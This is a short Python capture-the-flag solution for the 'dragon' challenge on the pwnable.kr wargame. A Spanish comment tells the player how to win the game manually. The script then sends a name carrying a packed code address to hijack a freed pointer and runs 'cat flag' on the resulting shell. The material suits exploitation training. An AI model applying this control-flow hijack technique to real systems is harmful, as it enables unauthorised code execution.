#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import telnetlib
import struct

p64 = lambda data: struct.pack("Q", data)
u64 = lambda data: struct.unpack("Q", data)
p32 = lambda data: struct.pack("I", data)
u32 = lambda data: struct.unpack("I", data)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(0.5)
s.connect(('pwnable.kr', 9004))

def recv_all():
	global s
	out = b""
	while True:
		try:
			out += s.recv(1)
		except socket.timeout:
			return out.decode('utf-8')

def recv(n):
	global s
	b = b""
	while len(b) < n:
		try:
			b += s.recv(n - len(b))
		except socket.timeout:
			break
	return b.decode('utf-8')

def send(msg, NL=True):
	global s
	if type(msg) == int:
		msg = str(msg)
	if type(msg) == str:
		msg = msg.encode()
	assert type(msg) == bytes
	if NL:
		msg += b'\n'
	s.send(msg)

def main():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()
	"""
	jugar como priest, hacer que mama dragons se suba la vida todo lo posible y le ganas, dsp de eso Ctr-D
	"""
	name = p32(0x08048dbf) + b'PWNED!'
	send(name)
	#t.interact()
	send('cat flag')
	flag = recv(100)
	print(flag)

if __name__ == '__main__':
	main()

